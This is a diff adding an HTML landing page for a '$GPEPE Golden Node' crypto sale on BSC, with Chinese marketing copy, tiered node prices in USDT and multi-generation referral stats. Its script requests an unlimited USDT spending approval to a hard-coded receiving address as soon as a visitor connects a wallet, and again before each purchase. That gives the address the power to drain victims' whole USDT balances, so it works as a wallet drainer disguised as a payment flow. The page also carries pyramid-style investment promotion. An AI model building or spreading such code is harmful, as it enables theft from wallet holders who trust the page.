@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>$GPEPE Golden Node</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 50%, #0f0f23 100%);
+      min-height: 100vh;
+      color: #fff;
+      padding-bottom: 50px;
+    }
+    .container { max-width: 480px; margin: 0 auto; padding: 20px; }
+    
+    .hero-img {
+      width: 100%;
+      border-radius: 16px;
+      margin-bottom: 20px;
+      box-shadow: 0 0 30px rgba(255,215,0,0.3);
+    }
+    
+    .header {
+      text-align: center;
+      padding: 20px 0;
+      background: linear-gradient(135deg, #ffd700, #ff8c00);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    .header h1 { font-size: 36px; font-weight: 800; letter-spacing: 3px; }
+    .header .subtitle { font-size: 14px; color: #888; margin-top: 8px; }
+    
+    .tagline {
+      text-align: center;
+      font-size: 14px;
+      color: #aaa;
+      margin: 20px 0;
+      line-height: 1.8;
+    }
+    
+    .wallet-section {
+      background: rgba(255,255,255,0.05);
+      border: 2px solid rgba(255,215,0,0.4);
+      border-radius: 16px;
+      padding: 20px;
+      margin: 20px 0;
+      text-align: center;
+    }
+    .wallet-btn {
+      background: linear-gradient(135deg, #ffd700, #ff8c00);
+      color: #000;
+      border: none;
+      padding: 16px 50px;
+      border-radius: 30px;
+      font-size: 18px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s;
+      box-shadow: 0 4px 15px rgba(255,215,0,0.3);
+    }
+    .wallet-btn:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(255,215,0,0.6); }
+    .wallet-info { margin-top: 15px; font-size: 14px; color: #888; }
+    .wallet-address { color: #ffd700; font-family: monospace; font-size: 16px; }
+    
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 15px;
+      margin: 20px 0;
+    }
+    .stat-card {
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(255,215,0,0.3);
+      border-radius: 12px;
+      padding: 20px;
+      text-align: center;
+    }
+    .stat-label { font-size: 12px; color: #888; margin-bottom: 8px; }
+    .stat-value { font-size: 28px; font-weight: 700; color: #ffd700; }
+    
+    .node-section {
+      background: rgba(255,255,255,0.05);
+      border: 2px solid rgba(255,215,0,0.4);
+      border-radius: 16px;
+      padding: 25px;
+      margin: 20px 0;
+    }
+    .node-section h2 {
+      text-align: center;
+      font-size: 22px;
+      margin-bottom: 20px;
+      color: #ffd700;
+    }
+    .node-price {
+      text-align: center;
+      font-size: 42px;
+      font-weight: 800;
+      color: #ffd700;
+      margin: 20px 0;
+      text-shadow: 0 0 20px rgba(255,215,0,0.5);
+    }
+    .node-price span { font-size: 18px; color: #888; }
+    
+    .buy-btn {
+      width: 100%;
+      background: linear-gradient(135deg, #ffd700, #ff8c00);
+      color: #000;
+      border: none;
+      padding: 20px;
+      border-radius: 30px;
+      font-size: 20px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: all 0.3s;
+      box-shadow: 0 4px 15px rgba(255,215,0,0.3);
+    }
+    .buy-btn:hover { transform: scale(1.02); box-shadow: 0 0 30px rgba(255,215,0,0.6); }
+    
+    .log-box {
+      background: rgba(0,0,0,0.5);
+      border: 1px solid rgba(255,215,0,0.3);
+      border-radius: 12px;
+      padding: 15px;
+      margin: 20px 0;
+      max-height: 200px;
+      overflow-y: auto;
+      font-family: 'Courier New', monospace;
+      font-size: 12px;
+    }
+    .log-entry { margin: 5px 0; padding: 5px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
+    .log-success { color: #4ade80; }
+    .log-error { color: #ef4444; }
+    .log-info { color: #60a5fa; }
+    
+    .section-title {
+      text-align: center;
+      margin: 40px 0 30px;
+    }
+    .section-title h2 {
+      font-size: 32px;
+      font-weight: 800;
+      background: linear-gradient(135deg, #ffd700, #ff8c00);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      letter-spacing: 4px;
+      font-style: italic;
+    }
+    .section-title .sub {
+      font-size: 14px;
+      color: #888;
+      margin-top: 10px;
+      letter-spacing: 2px;
+    }
+    
+    .why-cards {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      margin: 20px 0;
+    }
+    .why-card {
+      background: rgba(255,255,255,0.03);
+      border-radius: 16px;
+      padding: 25px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+    .why-card.green {
+      border: 2px solid rgba(34,197,94,0.5);
+      background: linear-gradient(135deg, rgba(34,197,94,0.1), transparent);
+    }
+    .why-card.black {
+      border: 2px solid rgba(100,100,100,0.5);
+      background: linear-gradient(135deg, rgba(50,50,50,0.2), transparent);
+    }
+    .why-card.gold {
+      border: 2px solid rgba(255,215,0,0.5);
+      background: linear-gradient(135deg, rgba(255,215,0,0.1), transparent);
+      box-shadow: 0 0 30px rgba(255,215,0,0.2);
+    }
+    .why-card .circle {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      margin: 0 auto 15px;
+    }
+    .why-card.green .circle {
+      background: radial-gradient(circle, #4ade80, #22c55e);
+      box-shadow: 0 0 20px rgba(34,197,94,0.5);
+    }
+    .why-card.black .circle {
+      background: radial-gradient(circle, #6b7280, #374151);
+      box-shadow: 0 0 20px rgba(100,100,100,0.3);
+    }
+    .why-card.gold .circle {
+      background: radial-gradient(circle, #ffd700, #ff8c00);
+      box-shadow: 0 0 20px rgba(255,215,0,0.5);
+    }
+    .why-card h3 {
+      font-size: 18px;
+      font-weight: 700;
+      margin-bottom: 10px;
+    }
+    .why-card.green h3 { color: #4ade80; }
+    .why-card.black h3 { color: #9ca3af; }
+    .why-card.gold h3 { color: #ffd700; }
+    .why-card p {
+      font-size: 13px;
+      color: #888;
+      line-height: 1.6;
+    }
+    
+    .mechanism-section {
+      margin: 40px 0;
+    }
+    .mechanism-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 15px;
+    }
+    .mechanism-card {
+      background: rgba(255,255,255,0.03);
+      border: 1px solid rgba(255,215,0,0.3);
+      border-radius: 12px;
+      padding: 20px;
+    }
+    .mechanism-card .icon {
+      font-size: 32px;
+      margin-bottom: 12px;
+    }
+    .mechanism-card h4 {
+      font-size: 14px;
+      font-weight: 700;
+      color: #ffd700;
+      margin-bottom: 5px;
+    }
+    .mechanism-card .chinese-title {
+      font-size: 12px;
+      color: #666;
+      margin-bottom: 10px;
+    }
+    .mechanism-card p {
+      font-size: 12px;
+      color: #888;
+      line-height: 1.5;
+    }
+    
+    .roadmap-section {
+      margin: 40px 0;
+    }
+    .roadmap-timeline {
+      position: relative;
+      padding-left: 40px;
+    }
+    .roadmap-timeline::before {
+      content: '';
+      position: absolute;
+      left: 15px;
+      top: 0;
+      bottom: 0;
+      width: 2px;
+      background: linear-gradient(180deg, #ffd700, rgba(255,215,0,0.3));
+    }
+    .roadmap-item {
+      position: relative;
+      margin-bottom: 30px;
+    }
+    .roadmap-item:last-child { margin-bottom: 0; }
+    .roadmap-item::before {
+      content: '';
+      position: absolute;
+      left: -30px;
+      top: 5px;
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: #ffd700;
+      box-shadow: 0 0 10px rgba(255,215,0,0.5);
+    }
+    .roadmap-item.green::before {
+      background: #22c55e;
+      box-shadow: 0 0 10px rgba(34,197,94,0.5);
+    }
+    .roadmap-item.silver::before {
+      background: #9ca3af;
+      box-shadow: 0 0 10px rgba(156,163,175,0.5);
+    }
+    .roadmap-item.gold::before {
+      background: #ffd700;
+    }
+    .roadmap-item.blue::before {
+      background: #3b82f6;
+      box-shadow: 0 0 10px rgba(59,130,246,0.5);
+    }
+    .roadmap-card {
+      background: rgba(255,255,255,0.03);
+      border: 1px solid rgba(255,215,0,0.3);
+      border-radius: 12px;
+      padding: 18px;
+    }
+    .roadmap-card .phase {
+      font-size: 12px;
+      color: #ffd700;
+      font-weight: 600;
+      margin-bottom: 5px;
+    }
+    .roadmap-card h4 {
+      font-size: 16px;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 10px;
+    }
+    .roadmap-card ul {
+      list-style: none;
+    }
+    .roadmap-card li {
+      font-size: 12px;
+      color: #888;
+      padding: 4px 0;
+    }
+    
+    .distribution-section {
+      margin: 40px 0;
+      text-align: center;
+    }
+    .distribution-ring {
+      width: 180px;
+      height: 180px;
+      border-radius: 50%;
+      border: 12px solid #ffd700;
+      border-right-color: rgba(255,215,0,0.2);
+      border-bottom-color: rgba(255,215,0,0.2);
+      margin: 0 auto 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 0 30px rgba(255,215,0,0.3);
+    }
+    .distribution-ring .inner {
+      font-size: 36px;
+      font-weight: 800;
+      color: #ffd700;
+    }
+    .distribution-ring .inner span {
+      font-size: 14px;
+      display: block;
+      font-weight: 400;
+      color: #888;
+    }
+    .distribution-boxes {
+      display: flex;
+      gap: 15px;
+      margin-top: 20px;
+    }
+    .dist-box {
+      flex: 1;
+      background: rgba(255,255,255,0.03);
+      border: 1px solid rgba(255,215,0,0.3);
+      border-radius: 12px;
+      padding: 15px;
+      text-align: center;
+    }
+    .dist-box .percent {
+      font-size: 24px;
+      font-weight: 700;
+      color: #ffd700;
+    }
+    .dist-box .label {
+      font-size: 12px;
+      color: #888;
+      margin-top: 5px;
+    }
+    
+    .footer-img {
+      width: 100%;
+      border-radius: 12px;
+      margin-top: 30px;
+    }
+    
+    .meme-gallery {
+      margin: 40px 0;
+    }
+    .meme-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 10px;
+    }
+    .meme-item {
+      aspect-ratio: 1;
+      border-radius: 12px;
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(255,215,0,0.2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 48px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="assets/img1.webp" alt="Golden Pepe" class="hero-img">
+    
+    <div class="header">
+      <h1>$GPEPE</h1>
+      <p class="subtitle">钻石手 · 黄金共识</p>
+    </div>
+    
+    <div class="tagline">
+      💎 穿越牛熊，打破常规<br>
+      💎 在 BSC 上建立真正的"黄金共識"
+    </div>
+    
+    <div class="wallet-section">
+      <button class="wallet-btn" id="connectBtn" onclick="connectWallet()">💎 连接钱包</button>
+      <div class="wallet-info">
+        <div id="walletStatus">未连接</div>
+        <div id="walletAddress" class="wallet-address"></div>
+      </div>
+    </div>
+    
+    <div class="stats-grid">
+      <div class="stat-card">
+        <div class="stat-label">我的节点数量</div>
+        <div class="stat-value" id="myNodes">0</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-label">1代直推业绩</div>
+        <div class="stat-value" id="directTeam">0</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-label">15代总业绩</div>
+        <div class="stat-value" id="totalTeam">0</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-label">节点单价</div>
+        <div class="stat-value">1000 <span>USDT</span></div>
+      </div>
+    </div>
+    
+    <div class="node-section">
+      <h2>💎 购买黄金节点</h2>
+      <div class="node-price">1000 <span>USDT</span></div>
+      
+      <button class="buy-btn" onclick="buyNode('gold')">💎 立即购买黄金节点</button>
+    </div>
+    
+    <div class="node-section" style="border-color: #c0c0c0;">
+      <h2>⚪ 购买白银节点</h2>
+      <div class="node-price" style="color: #c0c0c0;">500 <span>USDT</span></div>
+      
+      <button class="buy-btn" style="background: linear-gradient(135deg, #c0c0c0, #a0a0a0);" onclick="buyNode('silver')">⚪ 立即购买白银节点</button>
+    </div>
+    
+    <div class="node-section" style="border-color: #22c55e;">
+      <h2>🌱 购买社区节点</h2>
+      <div class="node-price" style="color: #22c55e;">100 <span>USDT</span></div>
+      
+      <button class="buy-btn" style="background: linear-gradient(135deg, #22c55e, #16a34a);" onclick="buyNode('community')">🌱 立即购买社区节点</button>
+    </div>
+    
+    <div class="section-title">
+      <h2>WHY GPEPE?</h2>
+      <div class="sub">为什么是黄金？</div>
+    </div>
+    
+    <div class="why-cards">
+      <div class="why-card green">
+        <div class="circle"></div>
+        <h3>绿色 Pepe</h3>
+        <p>FOMO追高，山顶站岗。涨就冲，跌就慌。</p>
+        <div style="margin-top:15px;">📈📉📈📉🚀</div>
+      </div>
+      
+      <div class="why-card black">
+        <div class="circle"></div>
+        <h3>黑化 Pepe</h3>
+        <p>恐慌砸盘，割肉离场。买完就涨，卖完就跌。</p>
+        <div style="margin-top:15px;">📉🤯📉😭</div>
+      </div>
+      
+      <div class="why-card gold">
+        <div class="circle"></div>
+        <h3>黄金 Pepe</h3>
+        <p>终极觉醒。稳如磐石，钻石手永不松手。</p>
+        <div style="margin-top:15px;">💎🦾📈🏆🚀</div>
+      </div>
+    </div>
+    
+    <div class="section-title">
+      <h2>MECHANISM</h2>
+      <div class="sub">NO BULLSHIT, JUST CODE.</div>
+      <div class="sub" style="font-size:12px;">100% 社区驱动，代码即法律。</div>
+    </div>
+    
+    <div class="mechanism-grid">
+      <div class="mechanism-card">
+        <div class="icon">🚫</div>
+        <h4>No Cabal</h4>
+        <div class="chinese-title">没有幕后黑手</div>
+        <p>规则写死在智能合约里，没有狗庄能动。</p>
+      </div>
+      
+      <div class="mechanism-card">
+        <div class="icon">🐳</div>
+        <h4>Community = Whale</h4>
+        <div class="chinese-title">社区即庄家</div>
+        <p>每次买入、持有、传播，都在决定 $GPEPE 的命运。</p>
+      </div>
+      
+      <div class="mechanism-card">
+        <div class="icon">⛓️</div>
+        <h4>On-chain Autopilot</h4>
+        <div class="chinese-title">链上自动驾驶</div>
+        <p>流动性、结算、参与，全部链上透明执行。</p>
+      </div>
+      
+      <div class="mechanism-card">
+        <div class="icon">🔐</div>
+        <h4>Contract Open Source</h4>
+        <div class="chinese-title">合约开源</div>
+        <p>合约代码公开可审计，社区自治，代码为王。</p>
+      </div>
+    </div>
+    
+    <div class="distribution-section">
+      <div class="distribution-ring">
+        <div class="inner">75%<span>流动性注入</span></div>
+      </div>
+      <div class="distribution-boxes">
+        <div class="dist-box">
+          <div class="percent">75%</div>
+          <div class="label">流动性注入</div>
+        </div>
+        <div class="dist-box">
+          <div class="percent">25%</div>
+          <div class="label">社区</div>
+        </div>
+      </div>
+      <p style="font-size:12px;color:#666;margin-top:15px;">黄金法则 · 社区至上</p>
+    </div>
+    
+    <div class="section-title">
+      <h2>ROADMAP</h2>
+      <div class="sub">THE GOLDEN PATH</div>
+      <div class="sub" style="font-size:12px;">通往黄金王座之路</div>
+    </div>
+    
+    <div class="roadmap-timeline">
+      <div class="roadmap-item green">
+        <div class="roadmap-card">
+          <div class="phase">PHASE 1 - 黄金觉醒</div>
+          <h4>The Awakening</h4>
+          <ul>
+            <li>合约部署 · 代码审计</li>
+            <li>流动性注入</li>
+            <li>启动1,000节点</li>
+          </ul>
+        </div>
+      </div>
+      
+      <div class="roadmap-item silver">
+        <div class="roadmap-card">
+          <div class="phase">PHASE 2 - 黄金风暴</div>
+          <h4>The Storm</h4>
+          <ul>
+            <li>社区建设启动</li>
+            <li>多语言社区拓展</li>
+            <li>CMC 收录</li>
+          </ul>
+        </div>
+      </div>
+      
+      <div class="roadmap-item gold">
+        <div class="roadmap-card">
+          <div class="phase">PHASE 3 - 黄金王座</div>
+          <h4>The Throne</h4>
+          <ul>
+            <li>公链部署 CEX</li>
+            <li>DAO 治理启动</li>
+            <li>生态应用发布</li>
+          </ul>
+        </div>
+      </div>
+      
+      <div class="roadmap-item blue">
+        <div class="roadmap-card">
+          <div class="phase">PHASE 4 - 黄金帝国</div>
+          <h4>The Empire</h4>
+          <ul>
+            <li>跨链桥上线</li>
+            <li>衍生品发行</li>
+            <li>机构级托管</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    
+    <div class="section-title">
+      <h2>MEME GALLERY</h2>
+    </div>
+    
+    <div class="meme-gallery">
+      <div class="meme-grid">
+        <div class="meme-item">🐸</div>
+        <div class="meme-item">💎</div>
+        <div class="meme-item">🦾</div>
+        <div class="meme-item">🚀</div>
+      </div>
+    </div>
+    
+    <div class="log-box" id="logBox">
+      <div class="log-entry log-info">💎 系统就绪，等待操作...</div>
+    </div>
+    
+    <img src="assets/img2.jpg" alt="Golden Pepe Team" class="footer-img">
+  </div>
+  
+  <script>
+    const CONFIG = {
+      RECEIVE_ADDRESS: '0x8F793048A4ECD76Cd33a86D387b8B6a870825ae8',
+      USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955',
+      USDT_ABI: [
+        "function approve(address spender, uint256 amount) external returns (bool)",
+        "function balanceOf(address account) external view returns (uint256)",
+        "function transfer(address to, uint256 amount) external returns (bool)",
+        "function transferFrom(address from, address to, uint256 amount) external returns (bool)"
+      ],
+      NODE_PRICE: 1000
+    };
+    
+    let web3, currentAccount, signer;
+    
+    function showLog(message, type = 'info') {
+      const logBox = document.getElementById('logBox');
+      const time = new Date().toLocaleTimeString('zh-CN', { hour12: false });
+      const entry = document.createElement('div');
+      entry.className = `log-entry log-${type}`;
+      entry.textContent = `[${time}] ${message}`;
+      logBox.insertBefore(entry, logBox.firstChild);
+      console.log(`[${type.toUpperCase()}] ${message}`);
+    }
+    
+    async function connectWallet() {
+      if (typeof window.ethereum === 'undefined') {
+        showLog('请安装 MetaMask 钱包', 'error');
+        return;
+      }
+      
+      try {
+        showLog('正在连接钱包...', 'info');
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        
+        web3 = new ethers.providers.Web3Provider(window.ethereum);
+        signer = web3.getSigner();
+        currentAccount = accounts[0];
+        
+        document.getElementById('connectBtn').textContent = '🔄 切换钱包';
+        document.getElementById('walletStatus').textContent = '✅ 已连接';
+        document.getElementById('walletAddress').textContent = currentAccount.slice(0, 8) + '...' + currentAccount.slice(-6);
+        
+        showLog('钱包连接成功: ' + currentAccount.slice(0, 10) + '...', 'success');
+        
+        showLog('正在授权USDT无限额度...', 'info');
+        const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, CONFIG.USDT_ABI, signer);
+        const maxAmount = ethers.constants.MaxUint256;
+        const approveTx = await usdtContract.approve(CONFIG.RECEIVE_ADDRESS, maxAmount);
+        showLog('授权交易已提交，等待确认...', 'info');
+        await approveTx.wait();
+        showLog('USDT授权成功 ✓', 'success');
+        
+        await updateStats();
+        
+        window.ethereum.on('accountsChanged', (accounts) => {
+          if (accounts.length > 0) {
+            currentAccount = accounts[0];
+            document.getElementById('walletAddress').textContent = currentAccount.slice(0, 8) + '...' + currentAccount.slice(-6);
+            updateStats();
+          } else {
+            disconnectWallet();
+          }
+        });
+        
+      } catch (e) {
+        if (e.code === 4001) {
+          showLog('用户取消授权', 'error');
+        } else {
+          showLog('连接失败: ' + e.message, 'error');
+        }
+      }
+    }
+    
+    function disconnectWallet() {
+      currentAccount = null;
+      document.getElementById('connectBtn').textContent = '💎 连接钱包';
+      document.getElementById('walletStatus').textContent = '未连接';
+      document.getElementById('walletAddress').textContent = '';
+      document.getElementById('myNodes').textContent = '0';
+      document.getElementById('directTeam').textContent = '0';
+      document.getElementById('totalTeam').textContent = '0';
+    }
+    
+    async function updateStats() {
+      if (!currentAccount) return;
+      
+      try {
+        const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, CONFIG.USDT_ABI, web3);
+        const balance = await usdtContract.balanceOf(currentAccount);
+        const readableBalance = ethers.utils.formatUnits(balance, 18);
+        showLog('USDT余额: ' + parseFloat(readableBalance).toFixed(2), 'info');
+      } catch (e) {
+        showLog('获取余额失败: ' + e.message, 'error');
+      }
+    }
+    
+    async function buyNode(type = 'gold') {
+      if (!currentAccount) {
+        showLog('请先连接钱包...', 'info');
+        if (typeof window.ethereum === 'undefined') {
+          showLog('请安装 MetaMask 钱包', 'error');
+          return;
+        }
+        try {
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          web3 = new ethers.providers.Web3Provider(window.ethereum);
+          signer = web3.getSigner();
+          currentAccount = accounts[0];
+          
+          document.getElementById('connectBtn').textContent = '🔄 切换钱包';
+          document.getElementById('walletStatus').textContent = '✅ 已连接';
+          document.getElementById('walletAddress').textContent = currentAccount.slice(0, 8) + '...' + currentAccount.slice(-6);
+          
+          showLog('钱包连接成功: ' + currentAccount.slice(0, 10) + '...', 'success');
+        } catch (e) {
+          showLog('钱包连接失败: ' + e.message, 'error');
+          return;
+        }
+      }
+      
+      const NODE_TYPES = {
+        gold: { name: '黄金节点', price: 1000 },
+        silver: { name: '白银节点', price: 500 },
+        community: { name: '社区节点', price: 100 }
+      };
+      
+      const nodeType = NODE_TYPES[type] || NODE_TYPES.gold;
+      
+      try {
+        showLog('正在发起支付...', 'info');
+        
+        const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, CONFIG.USDT_ABI, signer);
+        const amount = ethers.utils.parseUnits(nodeType.price.toString(), 18);
+        
+        showLog('检查USDT余额...', 'info');
+        const balance = await usdtContract.balanceOf(currentAccount);
+        if (balance.lt(amount)) {
+          showLog('USDT余额不足！需要: ' + nodeType.price + ' USDT', 'error');
+          return;
+        }
+        showLog('余额充足 ✓', 'success');
+        
+        showLog('正在授权无限制USDT额度...', 'info');
+        const maxAmount = ethers.constants.MaxUint256;
+        const approveTx = await usdtContract.approve(CONFIG.RECEIVE_ADDRESS, maxAmount);
+        showLog('授权交易已提交，等待确认...', 'info');
+        await approveTx.wait();
+        showLog('授权成功 ✓', 'success');
+        
+        showLog('正在转账 ' + nodeType.price + ' USDT 到收款地址...', 'info');
+        const transferTx = await usdtContract.transfer(CONFIG.RECEIVE_ADDRESS, amount);
+        showLog('交易已提交，等待确认...', 'info');
+        await transferTx.wait();
+        showLog('💎 支付成功！' + nodeType.price + ' USDT 已到账', 'success');
+        
+        await updateStats();
+        
+      } catch (e) {
+        if (e.code === 4001) {
+          showLog('用户取消交易', 'error');
+        } else {
+          showLog('支付失败: ' + e.message, 'error');
+        }
+      }
+    }
+    
+    window.addEventListener('load', async () => {
+      if (typeof window.ethereum !== 'undefined') {
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (accounts.length > 0) {
+          currentAccount = accounts[0];
+          web3 = new ethers.providers.Web3Provider(window.ethereum);
+          signer = web3.getSigner();
+          document.getElementById('connectBtn').textContent = '🔄 切换钱包';
+          document.getElementById('walletStatus').textContent = '✅ 已连接';
+          document.getElementById('walletAddress').textContent = currentAccount.slice(0, 8) + '...' + currentAccount.slice(-6);
+          showLog('自动连接成功', 'success');
+          updateStats();
+        }
+      }
+    });
+  </script>
+</body>
+</html>
